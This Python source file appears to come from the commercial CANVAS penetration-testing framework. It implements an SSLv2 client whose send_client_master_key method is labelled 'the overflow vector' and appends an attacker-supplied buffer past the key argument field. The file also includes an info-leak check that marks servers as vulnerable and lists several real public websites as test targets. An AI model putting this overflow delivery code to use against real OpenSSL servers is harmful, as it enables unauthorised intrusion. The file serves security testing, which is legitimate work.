#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import socket
import sys
import select
import time
import threading
import struct
import os
import getopt
import random
import array
import hashlib

if "." not in sys.path:
    sys.path.append(".")

import RC4
import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit
from libs.Crypto.Util.number import *
from libs.Crypto.PublicKey import *
import array

Note_ssl_conn = """
typedef struct ssl_conn {
        int sockfd;

        u_char challenge[16];
        u_char master_key[16];
        u_char key_material[32];

        /* connection identifier */
        int conn_id_length;
        u_char conn_id[16];

        /* server certificate */
        X509 *x509;

        u_char *read_key;
        u_char *write_key;

        RC4_KEY *rc4_read_key;
        RC4_KEY *rc4_write_key;

        int read_seq;
        int write_seq;

        int encrypted;
} ssl_conn;

"""

MD5_DIGEST_LENGTH = 16
MAX_BUFSIZ = 16384
#Protocol Message Codes
SSL2_MT_ERROR                =  0
SSL2_MT_CLIENT_HELLO         =  1
SSL2_MT_CLIENT_MASTER_KEY    =  2
SSL2_MT_CLIENT_FINISHED      =  3
SSL2_MT_SERVER_HELLO         =  4
SSL2_MT_SERVER_VERIFY        =  5
SSL2_MT_SERVER_FINISHED      =  6
SSL2_MT_REQUEST_CERTIFICATE  =  7
SSL2_MT_CLIENT_CERTIFICATE   =  8

SSL2_MAX_SSL_SESSION_ID_LENGTH = 32
SSL2_MIN_CHALLENGE_LENGTH      = 16
SSL2_MAX_CHALLENGE_LENGTH      = 32
SSL2_CONNECTION_ID_LENGTH      = 16
SSL2_MAX_CONNECTION_ID_LENGTH  = 16
SSL2_SSL_SESSION_ID_LENGTH     = 16
SSL2_MAX_CERT_CHALLENGE_LENGTH = 32
SSL2_MIN_CERT_CHALLENGE_LENGTH = 16
SSL2_MAX_KEY_MATERIAL_LENGTH   = 24

class ssl_connection:
    def __init__(self):
        self.challenge = ""
        self.master_key = ""
        self.key_material = ""
        self.conn_id = ""
        self.x509 = ""
        self.read_key = ""
        self.write_key = ""
        self.rc4_read_key = None
        self.rc4_write_key = None
        self.read_seq = 0
        self.write_seq = 0
        self.encrypted = 0

class OpenSSLException(Exception):
    
    def __init__(self, args=None):
        self.args = args
        
    def __str__(self):
        return `self.args`
    
class OpenSSLClient(tcpexploit):
    
    def __init__(self, target, port=443):
        self.target = target
        self.port = port
        self.vulnerable = 1
        self.debug = 0
        
    def __fini__(self):
        if self.sck:
            self.sck.close()
            
    def connect_ssl(self):
        
        self.conn = ssl_connection()
        random.seed()
        try:
            self.sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
            self.sck.connect((self.target, self.port))
        except Exception, msg:
            print str(msg)
            raise OpenSSLException, "connection failed."
            
    def send_client_hello(self):
        
        for each in range(0, 16):
            self.conn.challenge += struct.pack("B", random.randint(0,0xff))
            
        self.hexprint("self.conn.challenge: ", self.conn.challenge)
        
        hello = struct.pack(">BHHHH24s16s", 0x01, 0x02, 0x18, 0x00, 0x10, "\x07\x00\xc0\x05\x00\x80\x03\x00\x80\x01\x00\x80\x08\x00\x80\x06\x00\x40\x04\x00\x80\x02\x00\x80", self.conn.challenge)

        self.write_ssl(hello)
    
    def get_server_hello(self):
        
        buf = self.read_ssl(MAX_BUFSIZ)
        
        if len(buf) < 11:
            raise OpenSSLException, "read len too small"
        
        t, sid, ct = struct.unpack(">BBB", buf[:3])
        ver, cert_len, cs_len, conn_id_len = struct.unpack(">HHHH", buf[3:11])
        
        if t != SSL2_MT_SERVER_HELLO:
            raise OpenSSLException, "unexpected response"
        if sid != 0:
            raise OpenSSLException, "session id error"
        if ct != 1:
            raise OpenSSLException, "certificate type failure"
        if ver != 2:
            raise OpenSSLException, "unsupported ssl version"
        
        if len(buf) != (11 + cert_len + cs_len + conn_id_len):
            print "malformed packet"
            #raise OpenSSLException, "malformed packet"
        
        self.conn.x509 = self.d2i_X509(buf[11:(11+cert_len)])
        
        if (cs_len % 3):
            raise OpenSSLException, "cipher specification error"
        
        found = 0
        for each in range(11+cert_len, 11+cert_len+cs_len, 3):
            a, b, c = struct.unpack(">BBB", buf[each:each+3])
            #print "%.2x %.2x %2.x" % (a, b, c)
            if a == 0x01 and b == 0x00 and c == 0x80:
                found = 1
                
        if not found:
            raise OpenSSLException, "crypto unsupported, 128 bit RC4 not found."
            #print "crypto unsupported, 128 bit RC4 not found."
            
        if conn_id_len > SSL2_MAX_CONNECTION_ID_LENGTH:
            #print "connection id length too long"
            raise OpenSSLException, "connection id length too long"
        
        of = 11 + cert_len + cs_len
        self.conn.conn_id = buf[of:(of+conn_id_len)]
        msg = "conn_id len: %d\nconn_id: \n" % conn_id_len
        self.hexprint(msg, self.conn.conn_id)
    
    def send_client_master_key(self, evil_buf=""):
        """this is the overflow vector"""
        
        #generate random RC4 master key: 16 bytes
        for each in range(0, 16):
            self.conn.master_key += struct.pack("B", random.randint(0,0xff))

        self.hexprint("master_key: \n", self.conn.master_key)
        #get pubkey from x509 cert.
        pkey = self.x509_get_pubkey()
        #pkey is a publickey object, check RSA.py and pubkey.py
        
        #OLD DESIGN ...
        #if not pkey["rsa"]:
            #raise OpenSSLException, "no public key in cert"
        #check public key type
        #if not RSA we are screwed.
        #if pkey["type"] != EVP_PKEY_RSA:
            #raise OpenSSLException, "non-rsa public key"
        #data = self.RSA_public_encrypt(self.conn.master_key, pkey["rsa"], EVP_PKEY_RSA)
        
        """
        from openssl:
         /* If a bad decrypt, continue with protocol but with a
         * random master secret (Bleichenbacher attack) */
         even if you muck up encrypting with the RSA.n, openssl will never
         complain, it will genereta a random master key and speak back to you.
         which is ofcourse annoying when you're developing a library from scracth.
        """
        clear = self.pkcs1_pad(pkey.n, self.conn.master_key)
        self.hexprint("Clear text + padding:\n", clear)
        data = pkey.encrypt(clear, K="")[0]
        enc_len = len(data)
        if self.debug:
            print "RSA cipher-text enc_len: %d" % enc_len
        if enc_len <= 0:
            raise OpenSSLException, "RSA pubkey encryption failed"
        
        if evil_buf:
            key_arg_len = 8 + len(evil_buf)
        else:
            key_arg_len = 0 #8
        
        #B: masterkey req., 3s: RC4 crypto, H: clear_key_len, H: enc_key_len, H:key_arg_len
        #client master key request: 1 byte
        #RC4 crypto: 3bytes
        #clear key length: short
        #encrypted key length: short
        #key argument length: short
        buf = struct.pack(">B3sHHH", 0x02, "\x01\x00\x80", 0x00, enc_len, key_arg_len)

        #add the encrypted master_key to the send buffer
        buf += data
        self.hexprint("RSA cipher-text: \n", data)
        
        if evil_buf:
            #now, fill the key_arg buffer
            buf += "B"*8            #if neccessary, use with random data or jmp XX code
            buf += evil_buf
        
        self.write_ssl(buf)
        #from now on we speak with crypto!
        self.conn.encrypted = 1
        if self.debug:
            print "CRYPTO enabled"
        
    def get_server_verify(self):
            
        buf = self.read_ssl()

        msg = "get_server_verify len_server_verify: %d\n" % len(buf)
        self.hexprint(msg, buf)
        
        if len(buf) != 17:
            raise OpenSSLException, "get_server_verify: malformed packet size"

        if struct.unpack(">B", buf[0])[0] != SSL2_MT_SERVER_VERIFY:
            raise OpenSSLException, "get_server_verify: not expected packet type"
        
        if buf[1:] != self.conn.challenge:
            raise OpenSSLException, "get_server_verify: crypto initiation failed"
        
    def send_client_finish(self):
        if self.debug:
            print "send_client_finish:"
        buf = struct.pack(">B", SSL2_MT_CLIENT_FINISHED)
        buf += self.conn.conn_id
        self.write_ssl(buf)
    
    def get_server_finish(self, flag=0):
        
        buf = self.read_ssl()
        
        self.hexprint("get_server_finish: \n", buf)
        
        if not buf:
            raise OpenSSLException, "get_server_finish: ssl read error"
        if struct.unpack(">B", buf[0])[0] != SSL2_MT_SERVER_FINISHED:
            raise OpenSSLException, "get_server_finish: not expected packet type"
        if flag:
            #check the value 112 ??
            if len(buf) < 112:
                self.vulnerable = 0
                raise OpenSSLException, "infoleak unsuccesful, server not vulnerable."
            else:
                return buf
        return ""
    
    def key_material(self):
        
        for each in ["\x30", "\x31"]:
            d = hashlib.md5()
            d.update(self.conn.master_key)
            d.update(each)
            d.update(self.conn.challenge)
            d.update(self.conn.conn_id)
            self.conn.key_material += d.digest()
            
        self.hexprint("key_material: \n", self.conn.key_material)
        
    def generate_keys(self):
        
        self.key_material()
        self.conn.read_key = self.conn.key_material[:16]
        self.conn.write_key = self.conn.key_material[16:]

        self.hexprint("generate_keys:\n", self.conn.read_key)
        self.hexprint("", self.conn.write_key)
        d = RC4.RC4()
        self.conn.rc4_read_key = d.RC4_set_key(self.conn.read_key)
        del d
        d = RC4.RC4()
        self.conn.rc4_write_key = d.RC4_set_key(self.conn.write_key)
        del d
        
    def d2i_X509(self, buf):        
        #NOT IMPLEMENTED
        #since no need to validate server CERT
        #check x509_get_pubkey instead

        #self.hexprint("X509 Cert:\n", buf)
        #print prettyprint(buf)
        return buf
    
    def pkcs1_pad(self, n, data):
        
        plen = len(long_to_bytes(n)) - len(data) - 3
        pad = 'Z' * plen
        if self.debug:
            print "padding len: %d\n" % plen
        return '\x00\x02' + pad + '\x00' + data
  

    def x509_get_pubkey(self):
        #pray this works!
        loc = self.conn.x509.find("\x05\x00\x03")
        if loc < 0: raise OpenSSLException, "no RSA support in server CERT"
        tmp = self.conn.x509[loc:]
        loc = tmp.find("\x05\x00\x03")
        if loc < 0: raise OpenSSLException, "no RSA support in server CERT"
        loc = loc + 13                    #start of BIGNUM RSA.n
        tmp = tmp[loc:loc+128]            #BIGNUM array size 128
        
        self.hexprint("RSA.n:\n", tmp)
        """
        #REVERSE byte order in a integer array, is that necessary ?
        #CONCLUSION: NO ITS NOT NECESSARY since bytes_to_long() takes care of it.
        l = len(tmp)
        rev = array.array("L", [])
        rev.fromstring(tmp)
        count, i = 0, 0x1f
        while count < l:
            rev[i] = struct.unpack(">L", tmp[count:(count+4)])[0]
            count += 4; i -= 1
        #for each in rev:
            #print "%.8x" % each
        n = bytes_to_long(rev.tostring())
        print hex(n)
        
        self.hexprint("RSA.n:\n", rev.tostring())
        """
        
        n = bytes_to_long(tmp)
        if self.debug:
            print hex(n)
        e = bytes_to_long("\x00\x01\x00\x01")
        pkey = RSA.construct((n, e))
        #print pkey.can_encrypt()
        #raise OpenSSLException, "I aint done!"
        return pkey
    
    def hexprint(self, msg, data):
        if not self.debug:
            return
        if msg:
            print "%s" % msg,
        for each in data:
            print "%.2x" % ord(each),
        print "\n",
        
    def read_ssl(self, len=0):
        
        buf = self.recvstuff(self.sck, 2)
        
        if not buf:
            raise OpenSSLException, "read_ssl: recv returned nothing. (IIS with no SSL config?)"
        
        a = struct.unpack(">B", buf[0])[0]
        b = struct.unpack(">B", buf[1])[0]
        
        if not (a & 0x80):
            read_len = ((a & 0x3f) << 8) | b
            buf = self.recvstuff(self.sck, 1)
            padding = struct.unpack(">B", buf[0])[0]
        else:
            read_len = ((a & 0x7f) << 8) | b
            padding = 0
        
        if len:
           if read_len <= 0 or read_len > len:
               print "warning! ssl_returned read_len: %d user_asked len: %d" % (read_len, len)
               
        if self.debug:
            print "read_len %d padding %d" % (read_len, padding)
            
        buf = self.recvstuff(self.sck, read_len)

        if self.conn.encrypted:
            if (MD5_DIGEST_LENGTH + padding) >= read_len:
                if struct.unpack("B", buf[0])[0] == SSL2_MT_ERROR and read_len == 3:
                    raise OpenSSLException, "error in read_ssl: crypto related."
                else:
                    raise OpenSSLException, "read_ssl: short ssl packet."
        else:
            return buf
        
        self.hexprint("read_ssl enc(md5+pad+text): ", buf)
        d = RC4.RC4()
        #self.hexprint("read_key: ", self.conn.read_key)
        #d.RC4_set_key(self.conn.read_key)
        text = d.RC4_update(self.conn.rc4_read_key, buf)
        if padding > 0:
            text = text[MD5_DIGEST_LENGTH:-padding]
        else:
            text = text[MD5_DIGEST_LENGTH:]
        #text = MD5_DIGEST + clear text + padding
        #strip padding and MD5_DIGEST
        self.hexprint("read_ssl clear text:\n", text)
        
        if struct.unpack("B", text[0])[0] == SSL2_MT_ERROR:
            if read_len != 3:
                raise OpenSSLException, "read_ssl: bad reply from server"
            else:
                raise OpenSSLException, "read_ssl: error from server"
            
        return text

    def corrupt_connid(self):
        
        i = len(self.conn.conn_id)
        self.conn.conn_id = ""
        for each in range(0, i):
            self.conn.conn_id += struct.pack("B", random.randint(0,0xff))
        
    def write_ssl(self, data):
        
        if self.conn.encrypted:
            total_len = len(data) + MD5_DIGEST_LENGTH
        else:
            total_len = len(data)
            
        if total_len + 2 > MAX_BUFSIZ:
            raise OpenSSLException, "write_ssl: buffer size too big"
        
        if self.debug:
            print "write_ssl total_len %d" % total_len
        
        buf = struct.pack(">H", total_len | 0x8000)
        
        if self.debug:
            print "write seq: %d" % self.conn.write_seq
        if self.conn.encrypted:
            d = hashlib.md5()
            d.update(self.conn.write_key)
            d.update(data)
            seq = struct.pack(">L", self.conn.write_seq)
            self.hexprint("sequence: ", seq)
            d.update(seq)
            self.hexprint("MD5 digest: \n", d.digest())
            #RC4 encrypt the md5_hash+data
            r = RC4.RC4()
            #r.RC4_set_key(self.conn.write_key)
            buf += r.RC4_update(self.conn.rc4_write_key, (d.digest() + data))
            #append
        else:
            buf += data
        if self.conn.encrypted:
            self.hexprint("write_ssl encrypt text:\n", buf)

        self.sendstuff(self.sck, buf)
        self.conn.write_seq += 1
        
    def sendstuff(self, sock, buf):
        
        count = 8
        d = len(buf)

        while count:
            rd, wr, ex = select.select([], [sock], [], 5)
            
            if not wr:
                if count:
                    count -= 1
                    continue
                else:
                    return 0
            
            if d > 0:
                dsent = sock.send(buf)
                d -= dsent
            else:
                return 1
            
    def recvstuff(self, sock, size=0):
        
            count = 8
            buf = ""
            
            while count:
                rd, wr, ex = select.select([sock], [], [], 5)

                if not rd:
                    if count:
                        count -= 1
                        continue
                    else:
                        if len(buf):
                           return buf
                        else:
                           return ""
                       
                if size:
                    tmp = sock.recv(size)
                else:
                    tmp = sock.recv(2<<20)
                    
                if tmp:
                    buf += tmp
                
                return buf

if __name__ == "__main__":
    #openssl s_server -accept 443 -ssl2 -www
    #d = OpenSSLClient("127.0.0.1", 443)
    #Apache
    d = OpenSSLClient("www.immunityinc.com", 443)
    #d = OpenSSLClient("www.turkcell.com.tr", 443)
    #IIS
    #d = OpenSSLClient("www.microsoft.com", 443)
    #Netscape/IPlanet
    #d = OpenSSLClient("www.wellsfargo.com", 443)
    #Google WhateverServer
    #d = OpenSSLClient("www.google.com", 443)
    
    d.connect_ssl()
    d.send_client_hello()
    d.get_server_hello()
    d.send_client_master_key()
    d.generate_keys()
    d.get_server_verify()
    d.send_client_finish()
    d.get_server_finish()
    
    print "sending the HTTP HEAD request"
    d.write_ssl("HEAD / HTTP/1.0\r\n\r\n")    
    print "reading from Webserver: \n%s" % d.read_ssl()
    
    del d
    
    
    
